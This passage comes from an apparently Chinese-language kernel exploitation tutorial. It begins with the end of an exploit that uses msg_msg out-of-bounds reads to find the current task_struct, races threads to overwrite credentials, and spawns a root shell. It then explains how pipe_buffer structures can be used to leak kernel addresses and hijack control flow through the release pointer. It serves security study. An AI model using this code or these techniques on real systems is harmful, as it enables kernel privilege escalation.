%p\n&quot;</span>, peek_msg(msq_id[<span class="number">0</span>], &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_msg.m_type: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak root cred addr from init_task&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], <span class="number">0x2b0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> prev = *(<span class="type">uint64_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG + <span class="number">8</span>];</span><br><span class="line">    <span class="type">uint32_t</span> pid = *(<span class="type">uint32_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG - TASKS_OFFSET + PID_OFFSET];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_task-&gt;tasks.prev: %#lx\n&quot;</span>, prev);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] init_task-&gt;pid: %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] current pid: %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    cur_task = init_task;</span><br><span class="line">    <span class="keyword">while</span> (pid != getpid()) &#123;</span><br><span class="line">        build_msg(fake_msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">114514</span>, DATALEN_MSG + DATALEN_SEG, prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">        edit_rule(<span class="number">0</span>, fake_msg, OUTBOUND, <span class="literal">false</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] peek_msg len: %p\n&quot;</span>, peek_msg(msq_id[<span class="number">0</span>], &amp;oob_msgbuf, DATALEN_MSG + DATALEN_SEG, <span class="number">0</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] msg_msg.m_type: %ld\n&quot;</span>, oob_msgbuf.mtype);</span><br><span class="line">        qword_dump(<span class="string">&quot;find task_struct&quot;</span>, &amp;oob_msgbuf.mtext[DATALEN_MSG], <span class="number">0x2b0</span>);</span><br><span class="line">        cur_task = prev - TASKS_OFFSET;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] task_struct addr: %p\n&quot;</span>, cur_task);</span><br><span class="line">        prev = *(<span class="type">uint64_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG + <span class="number">8</span>];</span><br><span class="line">        pid = *(<span class="type">uint32_t</span> *) &amp;oob_msgbuf.mtext[DATALEN_MSG - TASKS_OFFSET + PID_OFFSET];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] task_struct-&gt;tasks.prev: %#lx\n&quot;</span>, prev);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] task_struct-&gt;pid: %d\n&quot;</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] find current task_struct addr: %p\n&quot;</span>, cur_task);</span><br><span class="line"></span><br><span class="line">    read_msg(msq_id[<span class="number">1</span>], &amp;large_msgbuf, <span class="keyword">sizeof</span>(large_msgbuf.mtext), <span class="number">0x1919810</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> tid[<span class="number">2</span>];</span><br><span class="line">    pthread_create(&amp;tid[<span class="number">0</span>], <span class="literal">NULL</span>, change_next, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;tid[<span class="number">1</span>], <span class="literal">NULL</span>, change_cred, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(tid[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(tid[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> # pipe 管道相关</p>
<p><strong>管道</strong>同样是内核中十分重要也十分常用的一个 IPC
工具，同样地管道的结构也能够在内核利用中为我们所用，其本质上是创建了一个
virtual inode 与两个对应的文件描述符构成的。</p>
<h2
id="pipe_inode_infokmalloc-192gfp_kernel_account管道本体">pipe_inode_info（kmalloc-192|GFP_KERNEL_ACCOUNT）：管道本体</h2>
<p>在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong>
来表示的，对应的就是一个 <code>pipe_inode_info</code>
结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息，当我们创建一个管道时，内核会创建一个
VFS inode 与一个 <code>pipe_inode_info</code> 结构体：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *	@mutex: mutex protecting the whole thing</span></span><br><span class="line"><span class="comment"> *	@rd_wait: reader wait point in case of empty pipe</span></span><br><span class="line"><span class="comment"> *	@wr_wait: writer wait point in case of full pipe</span></span><br><span class="line"><span class="comment"> *	@head: The point of buffer production</span></span><br><span class="line"><span class="comment"> *	@tail: The point of buffer consumption</span></span><br><span class="line"><span class="comment"> *	@note_loss: The next read() should insert a data-lost message</span></span><br><span class="line"><span class="comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span></span><br><span class="line"><span class="comment"> *	@ring_size: total number of buffers (should be a power of 2)</span></span><br><span class="line"><span class="comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *	@tmp_page: cached released page</span></span><br><span class="line"><span class="comment"> *	@readers: number of current readers of this pipe</span></span><br><span class="line"><span class="comment"> *	@writers: number of current writers of this pipe</span></span><br><span class="line"><span class="comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *	@r_counter: reader counter</span></span><br><span class="line"><span class="comment"> *	@w_counter: writer counter</span></span><br><span class="line"><span class="comment"> *	@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *	@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *	@bufs: the circular array of pipe buffers</span></span><br><span class="line"><span class="comment"> *	@user: the user who created this pipe</span></span><br><span class="line"><span class="comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="数据泄露-5">数据泄露：</h3>
<ul>
<li><p>内核线性映射区（ direct mapping area）</p>
<p><code>pipe_inode_info-&gt;bufs</code>
为一个动态分配的结构体数组，因此我们可以利用他来泄露出内核的“堆”上地址。</p></li>
</ul>
<h2
id="pipe_bufferkmalloc-1kgfp_kernel_account管道数据">pipe_buffer（kmalloc-1k|GFP_KERNEL_ACCOUNT）：管道数据</h2>
<p>当我们创建一个管道时，在内核中会分配一个 <code>pipe_buffer</code>
结构体数组，申请的内存总大小刚好会让内核从 <code>kmalloc-1k</code>
中取出一个 object 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *	@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *	@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *	@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *	@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="分配pipe-系统调用族">分配：pipe 系统调用族</h3>
<p>创建管道使用的自然是 pipe 与 pipe2 这两个系统调用，其最终都会调用到
<code>do_pipe2()</code> 这个函数，不同的是后者我们可以指定一个
flag，而前者默认 flag 为 0</p>
<p>存在如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">	__do_pipe_flags()</span><br><span class="line">		create_pipe_files()</span><br><span class="line">			get_pipe_inode()</span><br><span class="line">				alloc_pipe_info()</span><br></pre></td></tr></table></figure></div>
<p>最终调用 <code>kcalloc()</code> 分配一个 <code>pipe_buffer</code>
数组，默认数量为 <code>PIPE_DEF_BUFFERS</code> （16）个，因此会直接从
<code>kmalloc-1k</code> 中拿 object：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure></div>
<h3 id="释放close-系统调用">释放：close 系统调用</h3>
<p>当我们关闭一个管道的两端之后，对应的管道就会被释放掉，相应地，<code>pipe_buffer</code>
数组也会被释放掉</p>
<p>对于管道对应的文件，其 <code>file_operations</code> 被设为
<code>pipefifo_fops</code> ，其中 release 函数指针设为
<code>pipe_release</code> 函数，因此在关闭管道文件时有如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pipe_release()</span><br><span class="line">    put_pipe_info()</span><br></pre></td></tr></table></figure></div>
<p>在 <code>put_pipe_info()</code>
中会将管道对应的文件计数减一，管道两端都关闭之后最终会走到
<code>free_pipe_info()</code> 中，在该函数中释放掉管道本体与 buffer
数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_pipe_info</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">		watch_queue_clear(pipe-&gt;watch_queue);</span><br><span class="line">		put_watch_queue(pipe-&gt;watch_queue);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, pipe-&gt;nr_accounted, <span class="number">0</span>);</span><br><span class="line">	free_uid(pipe-&gt;user);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;tmp_page)</span><br><span class="line">		__free_page(pipe-&gt;tmp_page);</span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="内存页的分配和释放">内存页的分配和释放</h3>
<p><code>pipe_buffer</code> 的 <code>page</code> 指针指向一个
<code>page</code> 结构体，而这个 <code>page</code>
结构体对应着一个内存页，这个内存页是 <code>pipe_buffer</code>
用来存取数据的 buffer 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ab16ead08443e3c896807d33afa52bfb.png"
                     
alt="在这里插入图片描述" 
                > 然而这个内存页不是在创建
<code>pipe_buffer</code> 的时候就分配的，而是在第一次向
<code>pipe_buffer</code> 中写入数据的时候分配。关键代码位于
<code>pipe_write</code> 函数，在检测到 <code>page</code> 为
<code>NULL</code> 时会向 buddy system 申请一张物理页。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> alloc_page(gfp_mask) alloc_pages(gfp_mask, 0)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">	<span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">		page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">			ret = ret ? : -ENOMEM;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		pipe-&gt;tmp_page = page;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">	buf-&gt;page = page;</span><br><span class="line">	buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">	buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">	buf-&gt;len = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div> 在
<code>pipe_read</code> 函数中如果 <code>pipe_buffer</code>
中的数据全部被读取出来则释放对应内存页。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">anon_pipe_buf_release</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> pipe_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> buf-&gt;page;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If nobody else uses this page, and we don&#x27;t already have a</span></span><br><span class="line"><span class="comment">	 * temporary page, let&#x27;s keep track of it as a one-deep</span></span><br><span class="line"><span class="comment">	 * allocation cache. (Otherwise just release our reference to it)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (page_count(page) == <span class="number">1</span> &amp;&amp; !pipe-&gt;tmp_page)</span><br><span class="line">		pipe-&gt;tmp_page = page;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		put_page(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">pipe_buf_release</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> pipe_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">		pipe_buf_release(pipe, buf);</span><br><span class="line">		spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">		tail++;</span><br><span class="line">		pipe-&gt;tail = tail;</span><br><span class="line">		spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div> ### 数据读取写入
pipe 负责读取和写入数据的函数为 <code>pipe_read</code> 和
<code>pipe_write</code> 。<br />
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="comment">/* Read -&gt;head with a barrier vs post_one_notification() */</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> head = smp_load_acquire(&amp;pipe-&gt;head);</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> tail = pipe-&gt;tail;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_empty(head, tail)) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line">			<span class="type">size_t</span> chars = buf-&gt;len;</span><br><span class="line">			<span class="type">size_t</span> written;</span><br><span class="line">			<span class="type">int</span> error;</span><br><span class="line">			written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line">			<span class="keyword">if</span> (unlikely(written &lt; chars)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!ret)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ret += chars;</span><br><span class="line">			buf-&gt;offset += chars;</span><br><span class="line">			buf-&gt;len -= chars;</span><br><span class="line">			<span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">				pipe_buf_release(pipe, buf);</span><br><span class="line">				spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">				tail++;</span><br><span class="line">				pipe-&gt;tail = tail;</span><br><span class="line">				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">			&#125;</span><br><span class="line">			total_len -= chars;</span><br><span class="line">			<span class="keyword">if</span> (!total_len)</span><br><span class="line">				<span class="keyword">break</span>;	<span class="comment">/* common path: read succeeded */</span></span><br><span class="line">			<span class="keyword">if</span> (!pipe_empty(head, tail))	<span class="comment">/* More to do? */</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">		<span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">			&#125;</span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">			<span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;</span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);</span><br><span class="line">			<span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!ret)</span><br><span class="line">					ret = -EFAULT;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			ret += copied;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 分析代码可知 <code>pipe_inode_info</code> 维护了一个
<code>pipe_buffer</code> 组成的双端队列，结构如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/486c6cf4734c5a7a9d2fcecbbcb565d9.png"
                     
alt="在这里插入图片描述" 
                > 具体到每个 <code>pipe_buffer</code> 其中的
<code>offset</code> 和 <code>len</code> 标记了 <code>pipe_buffer</code>
对应内存页中的数据。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/cf3c8037899cfdde0e69e675a22dae29.png"
                     
alt="在这里插入图片描述" 
                > ### 数据泄露</p>
<ul>
<li><p>内核 .text 段地址</p>
<p><code>pipe_buffer-&gt;pipe_buf_operations</code>
通常指向一张全局函数表，我们可以通过该函数表的地址泄露出内核 .text
段基址（通常为 <code>anon_pipe_buf_ops</code>）。</p></li>
</ul>
<h3 id="劫持内核执行流-2">劫持内核执行流</h3>
<p>当我们关闭了管道的两端时，会触发
<code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code>
这一指针。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">	 * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">	 * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">	 * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">	 * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">	 * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">	 * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">	 * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">	 * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">	 * cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	